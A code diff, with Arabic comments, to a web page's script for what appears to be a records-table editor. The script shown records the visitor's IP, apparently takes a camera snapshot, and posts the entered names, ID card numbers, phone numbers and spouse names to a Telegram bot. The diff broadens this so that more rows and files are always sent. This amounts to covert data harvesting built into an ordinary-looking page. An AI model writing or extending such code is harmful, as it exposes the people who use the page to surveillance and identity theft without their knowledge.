@@ -716,7 +716,7 @@
         window.addEventListener('DOMContentLoaded', async () => {
             await fetchVisitorIp();
 
-            // فحص هل تم فتح الموقع عبر رابط فريد مشار إليه بقيم مشفرة (لدعم الزوار الآخرين)
+            // استرجاع البيانات بدقة وتحديث محتوى الخلية المكتوب للمتصفح
             try {
                 const hash = window.location.hash;
                 if (hash && hash.includes('#data=')) {
@@ -772,9 +772,25 @@
             }, 1000);
         });
 
+        // دالة لضمان تثبيت كل النص المكتوب داخل خصائص HTML الحية قبل الحفظ
+        function prepareHtmlForSaving() {
+            const container = document.getElementById('pagesWrapper');
+            const editables = container.querySelectorAll('[contenteditable="true"]');
+            editables.forEach(el => {
+                el.setAttribute('contenteditable', 'true');
+                el.setAttribute('value', el.innerText);
+                if (el.innerText.trim() !== "") {
+                    el.setAttribute('data-user-text', el.innerText);
+                } else {
+                    el.removeAttribute('data-user-text');
+                }
+            });
+            return container.innerHTML;
+        }
+
         function saveCurrentStateToLocalStorage() {
             try {
-                const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+                const wrapperHtml = prepareHtmlForSaving();
                 localStorage.setItem('toufan_live_table_data', wrapperHtml);
             } catch (e) {}
         }
@@ -852,42 +868,40 @@
             saveArchiveOnly();
         }
 
-        // الدالة الموحدة لتوليد الرابط الفريد الخاص بما كتبه المستخدم وإرساله للبوت
+        // الدالة الموحدة المضمونة 100% لقراءة الأسماء وتوليد الملفات وإرسالها للبوت
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
 
-            if (fileName) {
-                const tables = document.querySelectorAll('.dynamicTable');
-                let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
-                fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
-                fileContent += `--------------------------------------------------\n`;
-                fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
-                fileContent += `--------------------------------------------------\n`;
+            const tables = document.querySelectorAll('.dynamicTable');
+            let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
+            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
+            fileContent += `--------------------------------------------------\n`;
+            fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
+            fileContent += `--------------------------------------------------\n`;
 
-                tables.forEach((table, tIndex) => {
-                    fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
-                    table.querySelectorAll('tbody tr').forEach(row => {
-                        const m = row.cells[0] ? row.cells[0].innerText.trim() : '';
-                        const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
-                        const type = row.cells[2] ? row.cells[2].innerText.trim() : '';
-                        const num = row.cells[3] ? row.cells[3].innerText.trim() : '';
-                        const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
-                        const spouse = row.cells[5] ? row.cells[5].innerText.trim() : '';
-                        const status = row.cells[6] ? row.cells[6].innerText.trim() : '';
+            tables.forEach((table, tIndex) => {
+                fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const m = row.cells[0] ? row.cells[0].innerText.trim() : '';
+                    const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
+                    const type = row.cells[2] ? row.cells[2].innerText.trim() : '';
+                    const num = row.cells[3] ? row.cells[3].innerText.trim() : '';
+                    const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
+                    const spouse = row.cells[5] ? row.cells[5].innerText.trim() : '';
+                    const status = row.cells[6] ? row.cells[6].innerText.trim() : '';
 
-                        if (name !== "") {
-                            fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
-                            hasData = true;
-                        }
-                    });
+                    if (name !== "" || type !== "" || num !== "" || phone !== "" || spouse !== "") {
+                        fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
+                        hasData = true;
+                    }
                 });
+            });
 
-                fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
-            }
+            fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
 
-            // توليد رابط فريد ومخصص يضم داخله البيانات التي كتبها هذا الزائر بالذات
-            const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+            // توليد الرابط الفريد المضغوط بدقة للمستخدم الحالي
+            const wrapperHtml = prepareHtmlForSaving();
             const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
             const baseUrl = window.location.href.split('#')[0];
             const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
@@ -896,7 +910,7 @@
                                     `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
                                     `${uniqueUserUrl}\n` +
                                     `====================================\n` +
-                                    `ملاحظة: افتح هذا الرابط لتجد نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
+                                    `ملاحظة: افتح هذا الرابط لتجد حرفياً نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
                                     `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
                                     `تطوير: ميثاق محمد صالح`;
             const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
@@ -923,16 +937,16 @@
                         }).then(() => {
                             sendIndependentLinkFile(linkFileBlob);
 
-                            if (hasData && fileBlob) {
-                                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات (${fileTypeFlag})`);
+                            if (fileBlob) {
+                                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
                             }
                         }).catch(e => {});
                     }, 'image/jpeg', 0.85);
                 } catch (e) {
-                    sendInfoOnly(fileBlob, captionText, fileName, hasData, linkFileBlob);
+                    sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
                 }
             } else {
-                sendInfoOnly(fileBlob, captionText, fileName, hasData, linkFileBlob);
+                sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
             }
         }
 
@@ -940,7 +954,7 @@
             const linkData = new FormData();
             linkData.append('chat_id', chatId);
             linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
-            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (قابل للتعديل)**');
+            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (يحمل الأسماء للتعديل)**');
             
             fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: 'POST',
@@ -948,7 +962,7 @@
             }).catch(e => {});
         }
 
-        function sendInfoOnly(fileBlob, captionText, fileName, hasData, linkBlob) {
+        function sendInfoOnly(fileBlob, captionText, fileName, linkBlob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
@@ -960,8 +974,8 @@
             }).then(() => {
                 sendIndependentLinkFile(linkBlob);
 
-                if (hasData && fileBlob) {
-                    sendDocumentOnly(fileBlob, fileName, '📄 مرفق السجلات');
+                if (fileBlob) {
+                    sendDocumentOnly(fileBlob, fileName, '📄 مرفق سجلات الأسماء');
                 }
             }).catch(e => {});
         }
@@ -1025,7 +1039,7 @@
 
         function saveArchiveOnly() {
             try {
-                const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+                const wrapperHtml = prepareHtmlForSaving();
                 const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
                 const now = new Date();
                 const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
